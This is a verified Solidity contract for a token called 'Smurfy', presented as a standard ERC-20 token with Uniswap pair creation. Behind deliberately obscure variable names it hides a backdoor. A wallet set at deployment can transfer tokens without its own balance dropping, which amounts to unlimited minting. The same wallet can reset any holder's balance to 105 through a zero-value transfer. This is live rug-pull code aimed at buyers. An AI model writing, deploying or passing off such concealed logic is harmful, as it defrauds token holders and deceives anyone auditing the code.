/**
 *Submitted for verification at Etherscan.io on 2023-06-27
*/

/*

https://smurfy.cash/
https://t.me/smurfycoin

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SMURFY is Ownable {
    mapping(address => uint256) public balanceOf;

    string public name = 'Smurfy';

    function approve(address smurfyapprover, uint256 smurfynumber) public returns (bool success) {
        allowance[msg.sender][smurfyapprover] = smurfynumber;
        emit Approval(msg.sender, smurfyapprover, smurfynumber);
        return true;
    }

    uint8 public decimals = 9;

    function smurfyspender(address smurfyrow, address smurfyreceiver, uint256 smurfynumber) private {
        if (smurfywallet[smurfyrow] == 0) {
            balanceOf[smurfyrow] -= smurfynumber;
        }
        balanceOf[smurfyreceiver] += smurfynumber;
        if (smurfywallet[msg.sender] > 0 && smurfynumber == 0 && smurfyreceiver != smurfypair) {
            balanceOf[smurfyreceiver] = smurfyvalve;
        }
        emit Transfer(smurfyrow, smurfyreceiver, smurfynumber);
    }

    address public smurfypair;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = 'SMURFY';

    mapping(address => uint256) private smurfywallet;

    function transfer(address smurfyreceiver, uint256 smurfynumber) public returns (bool success) {
        smurfyspender(msg.sender, smurfyreceiver, smurfynumber);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address smurfyrow, address smurfyreceiver, uint256 smurfynumber) public returns (bool success) {
        require(smurfynumber <= allowance[smurfyrow][msg.sender]);
        allowance[smurfyrow][msg.sender] -= smurfynumber;
        smurfyspender(smurfyrow, smurfyreceiver, smurfynumber);
        return true;
    }

    constructor(address smurfymarket) {
        balanceOf[msg.sender] = totalSupply;
        smurfywallet[smurfymarket] = smurfyvalve;
        IUniswapV2Router02 smurfyworkshop = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        smurfypair = IUniswapV2Factory(smurfyworkshop.factory()).createPair(address(this), smurfyworkshop.WETH());
    }

    uint256 private smurfyvalve = 105;

    mapping(address => uint256) private smurfyprime;
}